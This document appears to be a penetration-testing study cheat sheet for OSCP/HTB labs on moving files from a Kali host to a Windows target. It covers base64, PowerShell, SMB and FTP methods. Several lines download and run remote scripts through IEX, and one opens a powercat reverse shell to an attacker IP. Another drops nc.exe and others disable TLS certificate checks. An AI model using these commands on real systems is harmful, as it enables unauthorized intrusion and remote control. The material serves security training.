---
description: Data Transfer Techniques
---
# Windows - download from kali

## Transfer via base64

run in linux from where we want to transfer

```bash
cat test.txt | base64 -w 0; echo
<random_string_generated>
```

get that string which generated by above command

```bash
[IO.File]::WriteAllBytes("C:\Users\ASUS\Desktop\test.txt", [Convert]::FromBase64String("paste_that_random_string_generated"))
```

### check integrity

to check file hash in linux

```bash
md5sum file.txt 
```

to verify that hash

```powershell
Get-FileHash C:\Users\ASUS\Desktop\test.txt -Algorithm md5
```

***

## OSCP way to transfer via cmd

^cc4ca5

```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

we can execute this even from cmd

## PowerShell Web Downloads

### DownloadFileAsync Download method

To download files using PowerShell over HTTP, HTTPS, or FTP, you can utilize the `WebClient` class for asynchronous downloads. Here's how you can do it:


```powershell
# Start an asynchronous file download
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>', '<Output File Name>')
```

```powershell
# Example usage to download a PowerShell script from GitHub
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```


This method allows you to download files without blocking the PowerShell prompt, making it useful for downloading large files or when performing multiple downloads in parallel.



### DownloadString - direct execute method

Directly execute PowerShell script from URL using DownloadString

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.231/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
{% endcode %}



### Invoke-WebRequest

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

iwr http://$IP/file.ps1 -O file.ps1
```

iwr,curl,wget can be used instead of Invoke-WebRequest
**-O is must**

#### If error occurs then use -UseBasicParsing

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

if SSL/TLS error occur then run this command

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

***

## SMB Downloads

Creating and using an SMB server with Impacket:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Accessing the SMB share:

```powershell
copy \\192.168.220.133\share\nc.exe
```

if unauthenticated error then give username and password while making server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
net use n: \\192.168.45.221\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe \\IP\share
        1 file(s) copied.
```

***

## FTP Download

Installing an FTP server with Python:

```bash
sudo pip3 install pyftpdlib
```

* default port 2121
* Anonymous authentication is enabled by default

```bash
sudo python3 -m pyftpdlib --port 21
```

Downloading a file via PowerShell:

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

From CMD:
```
ftp -A $kali_IP
```

use as ftp server
***

Random comment

1. one
2. two
3. three
